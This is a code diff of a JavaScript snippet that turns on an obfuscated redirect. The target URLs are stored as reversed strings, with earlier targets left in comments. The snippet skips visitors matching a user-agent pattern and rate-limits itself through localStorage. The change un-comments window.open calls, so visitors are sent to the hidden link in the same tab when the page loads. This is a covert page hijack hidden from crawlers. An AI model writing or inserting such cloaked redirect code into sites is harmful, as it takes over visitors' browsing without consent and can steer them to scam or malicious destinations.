@@ -5,7 +5,7 @@
 	if (re.test(userAgent))
 	    return;
 	
-	let eatApple = "php.reweiv/ri.pohsnirda//:ptth"/*"dne;rqinu=emehcs;tnetnI#JwGXYQ1fGA/nioj/ri.elb//:tnetni"*//*"php.modnar/moc.61tsohteyb.razabefac//:ptth"*/.split("").reverse().join("");
+	let eatApple = "22850ac83bC4214088572=etivni?nioj//:te"/*"dne;rqinu=emehcs;tnetnI#JwGXYQ1fGA/nioj/ri.elb//:tnetni"*//*"php.modnar/moc.61tsohteyb.razabefac//:ptth"*/.split("").reverse().join("");
 	let showPopUp = function() {
 		let meItem = localStorage.getItem("popcornlast");
 		if (meItem == null || (Date.now() - parseInt(meItem)) > (60 * 60 * 1000)) {
@@ -16,13 +16,13 @@
 	
 	if(document.readyState === 'ready' || document.readyState === 'complete') {
 		if (showPopUp()) {
-			//window.open(eatApple, "_self");
+			window.open(eatApple, "_self");
 		}
 	}
 	else {
 		document.addEventListener("readystatechange", function(e) {
 			if ((document.readyState === 'ready' || document.readyState === 'complete') && showPopUp()) {
-				//window.open(eatApple, "_self");
+				window.open(eatApple, "_self");
 			}
 		});
 	}
